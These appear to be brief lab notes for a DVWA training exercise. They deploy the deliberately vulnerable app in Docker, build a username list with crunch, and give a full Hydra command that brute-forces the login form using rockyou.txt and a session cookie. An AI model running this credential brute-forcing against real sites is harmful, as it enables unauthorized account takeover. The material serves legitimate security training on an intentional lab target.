https://techbeatz.co.uk/cyber-security/dvwa-task-1-brute-force-using-hydra-developer-tools/

```
git clone https://github.com/jon94/dvwa-dd.git
```

Replace DD API KEY

```
docker compose up -d --force-recreate --no-deps --build
```

Login to wherever it is hosted in kodekloud to obtain the URL as well as the PHP SessID. These are needed for the bruteforce.

cd to /Tools/wordlists/

Generate username using crunch
- Generate between 5 - 8 letters from letters been a-n and output in usernames.txt
```
crunch 5 8 abcdefghijklmn -o usernames.txt
```
For password, we will use rockyou.txt as list

```
hydra -f -S 4280-port-c9ca66e998614364.labs.kodekloud.com http-form-get "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=752d8f869d751bceb05b112632080b5b" -l admin -P rockyou.txt
```